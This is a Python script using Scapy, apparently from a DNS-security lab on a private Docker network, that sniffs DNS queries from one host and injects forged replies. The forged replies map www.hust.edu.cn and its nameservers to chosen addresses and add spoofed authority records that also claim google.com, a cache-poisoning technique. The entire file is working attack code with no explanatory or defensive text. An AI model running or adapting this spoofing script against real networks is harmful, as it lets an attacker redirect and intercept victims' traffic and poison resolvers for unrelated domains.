#!/usr/bin/python3

from scapy.all import *

def spoof_dns(pkt):
    # Only filter the A query
    if (DNS not in pkt or pkt[DNS].qd.qtype != 1):
    	return

    # Swap the source and destination IP address and port number
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    if ('www.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # The Authority Section
        NSsec1 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns1.hust.edu.cn')
        NSsec2 = DNSRR(rrname='hust.edu.cn', type='NS', 
        	ttl=11803, rdata='ns2.hust.edu.cn')
        NSsec3 = DNSRR(rrname='google.com', type='NS', 
            ttl=11803, rdata='ns1.hust.edu.cn')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, 
        	rd=0, qr=1, qdcount=1, ancount=1, nscount=3, 
            arcount=0, an=Anssec, ns=NSsec1/NSsec2/NSsec3)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
    elif ('ns1.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='172.18.0.1')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, rd=0, 
        	qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
    elif ('ns2.hust.edu.cn' in pkt[DNS].qd.qname.decode('utf-8')):
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
        	ttl=11803, rdata='200.10.3.27')

        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, rd=0, 
        	qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)
        
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53 and src host 172.18.0.3'
pkt = sniff(iface='br-e4a075733e38', filter=f, prn=spoof_dns)
